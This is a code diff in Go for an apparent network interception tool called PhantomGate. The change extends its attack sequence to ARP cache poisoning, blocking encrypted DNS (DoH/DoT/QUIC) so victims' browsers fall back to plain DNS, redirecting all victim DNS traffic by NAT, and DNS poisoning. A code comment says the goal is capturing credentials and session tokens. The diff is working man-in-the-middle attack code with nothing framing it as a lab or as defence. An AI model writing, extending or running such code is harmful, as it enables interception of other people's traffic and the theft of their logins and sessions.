@@ -29,12 +29,14 @@ import (
 //       ↓
 //   Credentials + session tokens captured transparently
 type InterceptSuite struct {
-	arpPoisoner *ARPPoisoner
-	dnsPoisoner *Poisoner
-	gatewayIP   string
-	iface       string
-	redirectIP  string
-	targets     []string
+	arpPoisoner  *ARPPoisoner
+	dnsPoisoner  *Poisoner
+	gatewayIP    string
+	iface        string
+	redirectIP   string
+	targets      []string
+	dohBlocked   bool
+	dnsRedirected bool
 }
 
 // InterceptConfig configures the full interception suite
@@ -103,23 +105,45 @@ func (is *InterceptSuite) Start() error {
 	log.Println("")
 
 	// Step 1: Enable IP forwarding so intercepted traffic can reach its destination
-	log.Printf("[1/3] Enabling IP forwarding...")
+	log.Printf("[1/5] Enabling IP forwarding...")
 	if err := EnableIPForwarding(); err != nil {
 		return fmt.Errorf("failed to enable IP forwarding: %w", err)
 	}
 	log.Printf("      ✓ IP forwarding enabled")
 
 	// Step 2: Start ARP poisoning
-	log.Printf("[2/3] Starting ARP poisoner on %s...", is.iface)
+	log.Printf("[2/5] Starting ARP poisoner on %s...", is.iface)
 	if err := is.arpPoisoner.Start(); err != nil {
 		return fmt.Errorf("ARP poisoner failed: %w", err)
 	}
 	log.Printf("      ✓ ARP cache poisoning active (gateway: %s)", is.gatewayIP)
 
-	// Step 3: Start DNS poisoning (inline, on the wire)
-	log.Printf("[3/3] Starting DNS poisoner...")
+	// Step 3: Block DNS-over-HTTPS so browsers fall back to regular DNS
+	log.Printf("[3/5] Blocking DNS-over-HTTPS (DoH/DoT/QUIC)...")
+	if err := BlockDoH(); err != nil {
+		log.Printf("      ! DoH blocking partially failed: %v", err)
+	} else {
+		is.dohBlocked = true
+		log.Printf("      ✓ DoH/DoT/QUIC blocked — browsers forced to use regular DNS")
+	}
+
+	// Step 4: Redirect ALL victim DNS traffic (port 53) to us via NAT
+	// This catches victims who use 8.8.8.8, 1.1.1.1, or any custom DNS server
+	log.Printf("[4/5] Redirecting all victim DNS traffic to PhantomGate...")
+	if err := redirectDNS(is.redirectIP); err != nil {
+		log.Printf("      ! DNS redirect partially failed: %v", err)
+	} else {
+		is.dnsRedirected = true
+		log.Printf("      ✓ All DNS (port 53) from victims now redirected to %s", is.redirectIP)
+	}
+
+	// Step 5: Start DNS poisoning (inline, on the wire)
+	log.Printf("[5/5] Starting DNS poisoner...")
 	if err := is.dnsPoisoner.Start(); err != nil {
 		is.arpPoisoner.Stop()
+		if is.dohBlocked {
+			UnblockDoH()
+		}
 		return fmt.Errorf("DNS poisoner failed: %w", err)
 	}
 	log.Printf("      ✓ DNS poisoning active → %s", is.redirectIP)
@@ -142,17 +166,26 @@ func (is *InterceptSuite) Start() error {
 func (is *InterceptSuite) Stop() {
 	log.Println("\n  [!] Shutting down interception suite...")
 
-	// Stop in reverse order
-	log.Printf("  [1/3] Stopping DNS poisoner...")
+	log.Printf("  [1/5] Stopping DNS poisoner...")
 	is.dnsPoisoner.Stop()
 
-	log.Printf("  [2/3] Stopping ARP poisoner (restoring caches)...")
+	log.Printf("  [2/5] Removing DNS redirect rules...")
+	if is.dnsRedirected {
+		unredirectDNS(is.redirectIP)
+	}
+
+	log.Printf("  [3/5] Restoring DoH access...")
+	if is.dohBlocked {
+		UnblockDoH()
+	}
+
+	log.Printf("  [4/5] Stopping ARP poisoner (restoring caches)...")
 	is.arpPoisoner.Stop()
 
-	log.Printf("  [3/3] Disabling IP forwarding...")
+	log.Printf("  [5/5] Disabling IP forwarding...")
 	DisableIPForwarding()
 
-	log.Println("  [✓] Network state restored. Interception suite stopped.")
+	log.Println("  [+] Network state fully restored. Interception suite stopped.")
 }
 
 // AddTarget adds a domain to intercept at runtime
